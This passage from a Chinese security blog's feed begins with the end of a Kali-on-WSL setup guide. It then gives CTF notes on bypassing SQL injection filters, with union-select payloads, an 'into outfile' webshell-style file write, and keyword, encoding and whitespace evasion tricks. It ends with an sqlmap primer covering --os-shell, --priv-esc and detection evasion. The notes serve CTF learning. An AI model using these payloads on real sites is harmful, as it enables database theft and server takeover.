class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --unregister kali-linux</span><br></pre></td></tr></table></figure><img src="/posts/c12b1506032a/image-20240728164153343.png" class="" title="image-20240728164153343"><p>最后在非系统盘的指定位置导入kali的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --import kali-linux &lt;path_to_kali&gt; &lt;path_to_tar&gt;</span><br></pre></td></tr></table></figure><p>前一个路径为<strong>kali系统的存储路径</strong>，后一个为被导入的<strong>镜像的路径</strong></p><h2 id="配置默认登录用户"><a href="#配置默认登录用户" class="headerlink" title="配置默认登录用户"></a>配置默认登录用户</h2><p>将默认登录用户为非root用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali config --default-user r1ck</span><br></pre></td></tr></table></figure><h2 id="安装工具包"><a href="#安装工具包" class="headerlink" title="安装工具包"></a>安装工具包</h2><h3 id="升级软件包"><a href="#升级软件包" class="headerlink" title="升级软件包"></a>升级软件包</h3><p>使用<code>kali</code>命令打开wsl kali</p><p>执行<code>sudo apt update</code>更新软件包列表和元数据</p><img src="/posts/c12b1506032a/image-20240728170617639.png" class="" title="image-20240728170617639"><p>执行<code>sudo apt upgrade</code>升级所有已安装的软件包到最新版本</p><h3 id="工具包的选择"><a href="#工具包的选择" class="headerlink" title="工具包的选择"></a>工具包的选择</h3><p>此时的kali系统仍然只是一个轻量的原始Debian系统，不包含渗透工具，所以需要我们额外安装工具包</p><p>kali提供了不同量级的系统包，可以参照下表</p><div class="table-container"><table><thead><tr><th>工具包名称</th><th>内容</th><th>安装指令</th><th>磁盘占用大小</th></tr></thead><tbody><tr><td>kali-linux-default</td><td>包含在标准 Kali Linux 安装中的默认工具包。适用于大多数用户。</td><td><code>sudo apt install kali-linux-default</code></td><td>9 GB</td></tr><tr><td>kali-linux-large</td><td>比默认包含更多的工具，适合那些需要额外工具进行扩展测试的高级渗透工程师。</td><td><code>sudo apt install kali-linux-large</code></td><td>16 GB</td></tr><tr><td>kali-linux-everything</td><td>包含 Kali Linux 可提供的所有工具。这个包非常庞大，适用于需要全套工具的专业用户。</td><td><code>sudo apt install kali-linux-everything</code></td><td>30 GB</td></tr></tbody></table></div><p>更多种类的系统工具包可以执行下面的指令查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-cache search kali-linux</span><br></pre></td></tr></table></figure><img src="/posts/c12b1506032a/image-20240728172709337.png" class="" title="image-20240728172709337"><p>当然后续我们还可以安装一些额外轻量的工具包，运行下面的命令可以进行查询</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-cache search kali-tools</span><br></pre></td></tr></table></figure><p>通常我们执行<code>sudo apt install kali-linux-default</code>安装默认工具包即可，该工具包中包含了<strong>图形化界面</strong>，这是后续无缝模式的基础</p><p>下载完default工具包后会进入图形安装界面。当安装过程提示选择时，<strong>全部默认执行”yes”即可</strong></p><img src="/posts/c12b1506032a/image-20240728204011062.png" class="" title="image-20240728204011062"><h1 id="配置无缝模式"><a href="#配置无缝模式" class="headerlink" title="配置无缝模式"></a>配置无缝模式</h1><h2 id="安装VcXsrv"><a href="#安装VcXsrv" class="headerlink" title="安装VcXsrv"></a>安装VcXsrv</h2><p>安装Visual C++ Redistributable for Visual Studio 2015</p><p>下载链接：<a href="https://www.microsoft.com/en-US/download/details.aspx?id=48145">https://www.microsoft.com/en-US/download/details.aspx?id=48145</a></p><p>接下来安装VcXsrv</p><p>下载链接：<a href="https://sourceforge.net/projects/vcxsrv/">https://sourceforge.net/projects/vcxsrv/</a></p><p>安装完毕后进入VcXsrv的安装目录，找到xlaunch.exe文件</p><img src="/posts/c12b1506032a/image-20240728204835104.png" class="" title="image-20240728204835104"><p>双击打开，选择Multiple windows模式，Display number填0</p><img src="/posts/c12b1506032a/image-20240728204913600.png" class="" title="image-20240728204913600"><p>选择 Start no client</p><img src="/posts/c12b1506032a/image-20240728204949994.png" class="" title="image-20240728204949994"><p>把禁用访问控制勾选上</p><img src="/posts/c12b1506032a/image-20240728205012473.png" class="" title="image-20240728205012473"><p>选择保存配置，导出到当前目录下</p><img src="/posts/c12b1506032a/image-20240728205034462.png" class="" title="image-20240728205034462"><p>找到刚刚导出的文件<code>config.xlaunch</code></p><img src="/posts/c12b1506032a/image-20240728205116514.png" class="" title="image-20240728205116514"><p><strong>创建它的快捷方式并发送到桌面</strong>，方便以后快速打开VcXsrv</p><p>双击快捷方式启动</p><p>此时托盘会出现图标</p><img src="/posts/c12b1506032a/image-20240728205255753.png" class="" title="image-20240728205255753"><h2 id="安装win-kex"><a href="#安装win-kex" class="headerlink" title="安装win-kex"></a>安装win-kex</h2><p>打开wsl kali，输入如下命令安装win-kex</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install kali-win-kex</span><br></pre></td></tr></table></figure><h2 id="设置本机ip"><a href="#设置本机ip" class="headerlink" title="设置本机ip"></a>设置本机ip</h2><p>在主机的终端中执行<code>ipconfig</code>，查看最后一项 <code>vEthernet (WSL (Hyper-V firewall))</code>的IP地址</p><img src="/posts/c12b1506032a/image-20240728210927257.png" class="" title="image-20240728210927257"><p>将该IP地址记下</p><p>打开wsl kali，执行如下指令（<strong>最好在root权限下执行</strong>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.unlink /etc/resolv.conf</span><br><span class="line">2.echo &#x27;nameserver &lt;ip address&gt;&#x27; &gt; /etc/resolv.conf</span><br><span class="line">3.chattr +i /etc/resolv.conf</span><br></pre></td></tr></table></figure><p><code>&lt;ip address&gt;</code>处填上刚刚的IP地址</p><h2 id="验证无缝模式"><a href="#验证无缝模式" class="headerlink" title="验证无缝模式"></a>验证无缝模式</h2><p>在wsl kali中执行如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kex --sl --wtstart -s</span><br></pre></td></tr></table></figure><p>如果终端中显示执行成功，且页面变成了kali和windows的混杂，则说明无缝模式启动成功</p><p><style>.icsqyxzneevr{zoom: 50%;}</style><img src="/posts/c12b1506032a/image-20240728211616371.png" class="icsqyxzneevr" alt="image-20240728211616371"></p><h1 id="优化无缝模式的外观"><a href="#优化无缝模式的外观" class="headerlink" title="优化无缝模式的外观"></a>优化无缝模式的外观</h1><h2 id="隐藏kali桌面"><a href="#隐藏kali桌面" class="headerlink" title="隐藏kali桌面"></a>隐藏kali桌面</h2><p>默认的无缝模式下，kali系统的桌面也会显示出来</p><p>而我认为最完美的形式应该是<strong>只保留kali的菜单栏</strong>，这样可以从菜单栏中随时调用kali的工具</p><p><style>.tzwjhxxcmopp{zoom: 67%;}</style><img src="/posts/c12b1506032a/image-20240728212238475.png" class="tzwjhxxcmopp" alt="image-20240728212238475"></p><p>找到并点击菜单栏中的<strong>Session and Startup</strong>这一项</p><img src="/posts/c12b1506032a/image-20240728212420944.png" class="" title="image-20240728212420944"><p>进入<code>Current Session</code>一栏，将xfdesktop项的值改为<strong>Never</strong></p><p>这样我们再次进入无缝模式时，就不会再显示kali的桌面了（这里显示的是windows的桌面，只不过我的windows用的kali的壁纸😝）</p><img src="/posts/c12b1506032a/image-20240728212639613.png" class="" title="image-20240728212639613"><h2 id="调整菜单栏"><a href="#调整菜单栏" class="headerlink" title="调整菜单栏"></a>调整菜单栏</h2><p>完成上一步的隐藏桌面后，你一定还是觉得这个菜单栏看着不太舒服，不仅在桌面上可能会<strong>挡图标</strong>，而且进入浏览器之后，<strong>会挡住最上方的关闭等按钮</strong></p><img src="/posts/c12b1506032a/image-20240728212926742.png" class="" title="image-20240728212926742"><p>这里我们只需调整一下菜单栏的外观</p><p>右键菜单栏，选择Panel菜单下的<strong>Panel Preferences</strong></p><img src="/posts/c12b1506032a/image-20240728213017957.png" class="" title="image-20240728213017957"><p>取消勾选Lock panel，并将长度调整为1000左右</p><p>此时上方的菜单栏便可通过拖动最左侧的区域来改变位置，一般来说<strong>拖到上方的正中央即可</strong></p><img src="/posts/c12b1506032a/image-20240728213458917.png" class="" title="image-20240728213458917"><p>最后我们可以适当增加一下菜单栏中的图标大小，效果如下</p><img src="/posts/c12b1506032a/image-20240728213613371.png" class="" title="image-20240728213613371"><h1 id="设置快捷启动方式"><a href="#设置快捷启动方式" class="headerlink" title="设置快捷启动方式"></a>设置快捷启动方式</h1><p>我们可以将启动无缝模式的命令整合到终端中</p><p>这样设置一个命令行模式和无缝模式，想用哪个用哪个</p><p>进入终端的设置，点击<strong>打开JSON文件</strong></p><img src="/posts/c12b1506032a/image-20240728213832134.png" class="" title="image-20240728213832134"><p>在<code>profiles</code>项的<code>list</code>中增加下面两项配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;commandline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wsl -d kali-linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;guid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d3&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hidden&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///c:/users/26944/pictures/icons/kali-logo.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kali\u547d\u4ee4\u884c&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;startingDirectory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;//wsl$/kali-linux/home/r1ck&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;commandline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wsl -d kali-linux kex --sl --wtstart -s&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;guid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hidden&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///c:/users/26944/pictures/icons/kali-logo.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kali\u65e0\u7f1d\u6a21\u5f0f&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;startingDirectory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;//wsl$/kali-linux/home/r1ck&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>注意记得<strong>修改一下启动目录中的用户名</strong></p><p>这样我们的终端中就可以随时调用wsl kali的两种模式了</p><img src="/posts/c12b1506032a/image-20240728214147837.png" class="" title="image-20240728214147837">]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> kali </tag>
            
            <tag> wsl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入 各种过滤的绕过姿势总结</title>
      <link href="/posts/4c025cd5aca8/"/>
      <url>/posts/4c025cd5aca8/</url>
      
        <content type="html"><![CDATA[<h2 id="回显过滤"><a href="#回显过滤" class="headerlink" title="回显过滤"></a>回显过滤</h2><p>这一类的过滤从服务端传回客户端的响应内容</p><h3 id="字段值过滤"><a href="#字段值过滤" class="headerlink" title="字段值过滤"></a>字段值过滤</h3><h4 id="常量绕过（数字或字符串）"><a href="#常量绕过（数字或字符串）" class="headerlink" title="常量绕过（数字或字符串）"></a>常量绕过（数字或字符串）</h4><p>如果对回显内容中<strong>不重要的字段</strong>的值过滤，可以将其替代为常量，此时回显中该字段的值为字段名的数字或字符串</p><p>例如如下payload，将username字段用常量1代替</p><p><code>1&#39; union select 1,password from ctfshow_user2 where username=&#39;flag&#39;  -- qwe</code></p><h4 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h4><p>如果是对回显内容中字段的值过滤，可以使用<strong>hex()</strong>将关键词转为十六进制数</p><p>例如如下payload</p><p><code>-1&#39; union select id,hex(username),password from ctfshow_user3 where username=&#39;flag&#39; -- qwe</code></p><h4 id="replace绕过"><a href="#replace绕过" class="headerlink" title="replace绕过"></a>replace绕过</h4><p>replace绕过主要是应对对于回显结果的检测</p><p>比如下面的检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>我们可以将被过滤的字符串替换为我们指定的字符串，然后将回显结果替换回去</p><p>比如上述检测我们可以使用如下replace绕过</p><p>首先<strong>用replace将回显中的数字替换</strong></p><p><code>replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;)</code></p><p>得到回显结果后，将结果使用下面的python脚本复原</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cipher = <span class="string">&quot; &quot;</span></span><br><span class="line">flag = Cipher.replace(<span class="string">&quot;@A&quot;</span>, <span class="string">&quot;1&quot;</span>).replace(<span class="string">&quot;@B&quot;</span>, <span class="string">&quot;2&quot;</span>).replace(<span class="string">&quot;@C&quot;</span>, <span class="string">&quot;3&quot;</span>).replace(<span class="string">&quot;@D&quot;</span>, <span class="string">&quot;4&quot;</span>).replace(<span class="string">&quot;@E&quot;</span>, <span class="string">&quot;5&quot;</span>).replace(<span class="string">&quot;@F&quot;</span>, <span class="string">&quot;6&quot;</span>).replace(<span class="string">&quot;@G&quot;</span>, <span class="string">&quot;7&quot;</span>).replace(<span class="string">&quot;@H&quot;</span>, <span class="string">&quot;8&quot;</span>).replace(<span class="string">&quot;@I&quot;</span>, <span class="string">&quot;9&quot;</span>).replace(<span class="string">&quot;@J&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="导出回显（针对全字符过滤）"><a href="#导出回显（针对全字符过滤）" class="headerlink" title="导出回显（针对全字符过滤）"></a>导出回显（针对全字符过滤）</h3><p>当回显中的所有ASCII字符均被过滤时，考虑将回显输出到网站根目录下的txt文件中</p><p>例如如下情况：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时可以利用<strong>into</strong>语句</p><p>payload为<code>-1&#39; union select username,password from ctfshow_user5 where username=&#39;flag&#39; into outfile &#39;/var/www/html/ctf.txt&#39; -- qwe</code></p><p>再访问<code>/ctf.txt</code>即可</p><h2 id="传参-payload-过滤"><a href="#传参-payload-过滤" class="headerlink" title="传参(payload)过滤"></a>传参(payload)过滤</h2><h3 id="字段值过滤-1"><a href="#字段值过滤-1" class="headerlink" title="字段值过滤"></a>字段值过滤</h3><h4 id="16进制绕过-1"><a href="#16进制绕过-1" class="headerlink" title="16进制绕过"></a>16进制绕过</h4><p>如果是对payload传参内容中目标字段值的过滤，可以将其用对应的十六进制值代替，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username = 0x7465737431;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p>当单双引号被禁用时，我们也可以将字段值用十六进制值来代替，这样值的位置就从字符串变为十六进制，避免使用引号</p><h4 id="通配符绕过（模糊查询）"><a href="#通配符绕过（模糊查询）" class="headerlink" title="通配符绕过（模糊查询）"></a>通配符绕过（模糊查询）</h4><p>我们可以使用<strong>模糊查询like</strong>配合通配符来绕过对字段值的过滤</p><p>比如flag被过滤，我们可以构造如下payload</p><p><code>-1&#39;or(username)like&#39;f%</code></p><p>或者<code>-1&#39;or(username)like&#39;%g</code></p><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>常用于 <code>waf</code>的正则表达式对大小写不敏感的情况</p><p>例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p><div class="note info flat"><p>在 SQL 中，<strong>关键字</strong>和<strong>函数名</strong>是不用区分字母大小写的，比如 SELECT、WHERE、ORDER、GROUP BY 等关键字，以及 ABS、MOD、ROUND、MAX 等函数名。</p></div><h4 id="改变编码"><a href="#改变编码" class="headerlink" title="改变编码"></a>改变编码</h4><p>通过hex、urlencode、url等编码替换关键字中的字符</p><p>例如<code>or</code>可以替换为<code>%6fr</code></p><h4 id="关键字双写"><a href="#关键字双写" class="headerlink" title="关键字双写"></a>关键字双写</h4><p>如果过滤器仅查找并移除单个实例的关键字，攻击者可以通过重复关键字来绕过过滤</p><p>例如，如果过滤器设计为移除单个的 <code>SELECT</code>，攻击者可以在注入代码中使用 <code>SESELECTLECT</code></p><p>在某些情况下，解析器在处理这类输入时会忽略中间的重叠部分，从而解析为有效的 <code>SELECT</code></p><p>同样，<code>and</code>可以替换为<code>aandnd</code>，<code>or</code>可以替换为<code>oorr</code></p><h4 id="使用相同功能的符号替换"><a href="#使用相同功能的符号替换" class="headerlink" title="使用相同功能的符号替换"></a>使用相同功能的符号替换</h4><p><code>and</code>关键字可以替换为<code>&amp;&amp;</code></p><p><code>or</code>关键字可以替换为<code>||</code></p><h4 id="舍弃关键字"><a href="#舍弃关键字" class="headerlink" title="舍弃关键字"></a>舍弃关键字</h4><p>如果关键字<code>select</code>被过滤，过滤时也不区分大小写，可以换一种思路来解题</p><p>例如将拼接的payload作为原本sql语句的查询条件</p><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><ol><li><p>注释<strong>`/</strong>/`**</p><div class="note info flat"><p>在MySQL中，用<code>/*注释*/</code>来标记注释的内容。</p></div><p>该绕过的原理是使用注释时会自动在语句中创建一个空格</p></li><li><p><strong>反引号</strong>（只能括表名和字段名）</p><div class="note warning flat"><p>反引号只能替代<strong>字段名、表名</strong>前后的空格</p></div><p>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 替换前</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;Union Select id,username,password from ctfshow_user where username =&#x27;</span>flag<span class="string">&#x27; -- qwe</span></span><br><span class="line"><span class="string"># 替换后</span></span><br><span class="line"><span class="string">-1&#x27;</span><span class="keyword">Union</span><span class="comment">/**/</span><span class="keyword">Select</span>`id`,`username`,`password`<span class="keyword">from</span>`ctfshow_user`<span class="keyword">where</span>`username`<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></li><li><p><strong>括号</strong>（仅能括能作为子查询的语句）</p><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;Union(Select(id),(username),(password)from(ctfshow_user)where(username)=&#x27;</span>flag<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure></li><li><p><strong>%09</strong></p><p>可以使用水平制表符替换空格，tab的url编码为%09</p></li><li><p><strong>%0a</strong></p><p>可以使用换行符替换空格，换行的url编码为%0a</p></li><li><p><strong>%0b</strong></p><p>垂直制表符</p></li><li><p><strong>%0c</strong></p><p>可以使用换页符替换空格，换页符的url编码为%0c</p></li><li><p><strong>%0d </strong></p><p>可以使用回车符替换空格，回车的url编码为%0d</p></li><li><p><strong>%a0</strong></p><p>可以使用不间断空格替换空格，不间断空格的url编码为%a0</p></li></ol><h3 id="注释过滤"><a href="#注释过滤" class="headerlink" title="注释过滤"></a>注释过滤</h3><p>SQL注入题最常过滤的就是注释符，所以需要多备一些注释的方法，方便在被过滤时灵活切换</p><p>常见注释如下：</p><ol><li><code>--空格</code></li><li><code>--%0c</code></li><li><code>#</code>或<code>%23</code></li><li><code>/**/</code></li><li><code>;%00</code></li></ol><p>当注释符都被过滤时，也可以考虑直接闭合后引号</p><p>例如<code>and &#39;a&#39;=&#39;a</code></p><h3 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h3><p>当payload语句中的<code>0-9</code>数字被过滤</p><p>我们可以尝试使用布尔值<code>true</code>相加l来构造单个数字，通过concat来拼接多个数字</p><p>例如<code>23</code>可以用<code>concat(true+true,true+true+true)</code></p><p>下面是一个现成的替换脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    temp=<span class="string">&quot;concat(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        tip=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.digits:</span><br><span class="line">            tmp=<span class="built_in">int</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip=<span class="number">1</span></span><br><span class="line">            temp+=<span class="string">&quot;char(&quot;</span></span><br><span class="line">            tmp=<span class="built_in">ord</span>(x)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">            temp+=<span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_d=<span class="string">&quot;(&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tmp):</span><br><span class="line">                temp_d+=<span class="string">&quot;true+&quot;</span></span><br><span class="line">            temp_d=temp_d[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tip==<span class="number">1</span>:</span><br><span class="line">                temp_d+=<span class="string">&quot;)&quot;</span></span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=<span class="string">&quot;,&quot;</span></span><br><span class="line">    <span class="comment"># 去掉最后一个逗号，将其改为反括号</span></span><br><span class="line">    temp=temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure><h3 id="where被过滤"><a href="#where被过滤" class="headerlink" title="where被过滤"></a>where被过滤</h3><p>当<code>where</code>关键字被过滤，且语句中未提供<code>where</code>关键字时，我们有两种绕过思路</p><ol><li><p>groupby+having替换where+like</p><p>关键字<code>where + like</code>可以使用<code>group by + having</code>来替代</p></li><li><p>使用join或right join</p><p>在SQL中，<code>JOIN</code> 语句用于结合两个或多个数据库表中的行。</p><p>详细用法可以参考文章<a href="https://blog.csdn.net/weixin_48083470/article/details/119043137">SQL注入 right/left join 详解与利用_sql注入right-CSDN博客</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap工具深入浅出</title>
      <link href="/posts/7ad0c78ef3a6/"/>
      <url>/posts/7ad0c78ef3a6/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p><p>详细教程可以参考下面这篇文章：</p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程<em>sqlmap *号</em>星落.的博客-CSDN博客</a></p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>在学习SQL注入的过程中尽量少用sqlmap，自动化程度过高不利于对原理和基础知识的学习</p><p>但是在ctf比赛中，使用sqlmap可以<strong>更快地发现漏洞类型</strong>，节省时间</p><h3 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h3><p><code>sqlmap -u &quot;http://example.com/vuln.php?id=1&quot;</code></p><p>连接-u后url的目标网站并进行扫描。</p><h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><h4 id="获取数据库数据"><a href="#获取数据库数据" class="headerlink" title="获取数据库数据"></a>获取数据库数据</h4><p><code>--dbs</code>：列出数据库的名称。<br><code>--tables</code>：列出数据库中的所有表。<br><code>--columns</code>：列出指定表中的所有字段。<br><code>--dump</code>：导出指定表中的数据。</p><div class="note warning flat"><p>渗透测试中尽量不要使用—dump，这种获取数据的行为俗称<strong>脱库</strong>，即<strong>利用网站的漏洞，获取数据库中的全部用户信息</strong>。如果没有经过防御方同意，则脱库是一种违法行为。</p></div><p><code>-D 数据库名</code>：指定进行枚举的数据库。</p><p><code>-T 表名</code>：指定进行枚举的数据库表。</p><p><code>-C 字段名</code>：指定进行枚举的数据库字段。</p><p><code>--tech</code>：指定注入手段，例如使用<code>--tech B</code>是指定使用布尔盲注</p><h4 id="绕过目标站点检测"><a href="#绕过目标站点检测" class="headerlink" title="绕过目标站点检测"></a>绕过目标站点检测</h4><p><code>--random-agent</code>：使用随机的user-agent头</p><p><code>--delay=n</code>：每次探测延时n秒（放置访问过快被ban）</p><p><code>--proxy=&quot;http://127.0.0.1:8080/&quot;</code>：使用代理</p><p><code>--count</code>：查看数据量</p><div class="note primary flat"><p>由于渗透测试中不方便使用<code>--dump</code>来获取数据，我们可以使用<code>--count</code>来查看数据量，进而确认是否为<strong>高价值数据库</strong></p></div><h4 id="获取目标服务器的操作控制权限"><a href="#获取目标服务器的操作控制权限" class="headerlink" title="获取目标服务器的操作控制权限"></a>获取目标服务器的操作控制权限</h4><p><code>--keep-alive</code>：建立长久的HTTP(S)连接 (与—proxy不兼容)</p><p><code>--is-dba</code>：查询目标数据库管理系统当前用户是否为DBA，如果为true则可以直接尝试getshell</p><p><code>--users</code>：枚举目标数据库管理系统所有的用户</p><p><code>--os-shell</code>：获取与目标系统交互的shell</p><p><code>--priv-esc</code>：数据库进程用户权限提升</p><h4 id="测试等级和风险"><a 